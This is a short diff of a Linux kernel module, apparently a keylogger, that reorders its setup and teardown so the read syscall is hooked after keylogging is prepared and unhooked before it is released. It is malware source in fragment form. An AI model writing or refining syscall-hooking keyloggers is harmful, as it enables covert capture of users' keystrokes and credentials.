@@ -17,18 +17,17 @@ static int __init mod_init(void)
   if(sct != NULL)
     printk(KERN_INFO "syscall table:%016lx\n",(long unsigned int) sct);
   else return 0;
-  hook_read(sct);
 
   perpare_keylogging();
-
+  hook_read(sct);
   return 0;
 }
 
 static void __exit mod_exit(void)
 {
   if(sct == NULL) return;
-  release_keylogging();
   unhook_read(sct);
+  release_keylogging();
 }
 
 
